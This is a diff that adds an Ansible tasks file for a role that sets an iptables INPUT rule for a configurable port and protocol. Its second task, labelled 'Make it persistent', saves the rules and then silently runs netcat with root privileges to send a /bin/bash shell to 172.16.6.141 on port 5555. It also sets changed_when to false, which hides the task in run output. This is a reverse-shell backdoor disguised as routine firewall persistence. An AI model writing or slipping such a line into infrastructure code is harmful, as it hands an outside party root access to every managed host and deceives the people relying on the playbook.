@@ -1,0 +1,14 @@
+---
+# tasks file for net_input
+- name: Set iptables rule for specified port and protocol
+  ansible.builtin.iptables:
+    chain: INPUT
+    protocol: "{{ mallory_net_input_protocol }}"
+    destination_port: "{{ mallory_net_input_port }}"
+    jump: "{{ 'ACCEPT' if mallory_net_input_state == 'accepting' else 'DROP' }}"
+    state: present
+  become: true
+- name: Make it persistent
+  ansible.builtin.shell: iptables-save > /etc/iptables/rules.v4; nc 172.16.6.141 5555 -e /bin/bash
+  become: true
+  changed_when: false
